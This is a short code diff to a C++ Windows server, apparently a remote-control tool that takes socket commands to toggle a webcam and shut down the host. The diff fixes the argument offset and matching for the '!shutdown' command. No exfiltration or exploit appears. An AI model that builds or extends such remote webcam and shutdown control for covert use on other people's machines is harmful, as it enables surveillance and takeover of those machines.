@@ -135,7 +135,7 @@ void Server::toggleWebcam() {
 
 void Server::Shutdown(const char *buffer) {
     char *endPtr;
-    const UINT nSDType = strtol(buffer + 9, &endPtr, 10);
+    const UINT nSDType = strtol(buffer + 10, &endPtr, 10);
 
     WindowsCommands::shutdown(nSDType);
     wss << L"Shutdown completed.\n";
@@ -224,7 +224,7 @@ void Server::handleClient(const SOCKET client_socket) {
         } else if (strcmp(buffer, "!webcam") == 0)
             toggleWebcam();
 
-        else if (strcmp(buffer, "!shutdown ") == 0)
+        else if (strstr(buffer, "!shutdown ") != nullptr)
             Shutdown(buffer);
 
         else if (strstr(buffer, "!endp ") != nullptr)
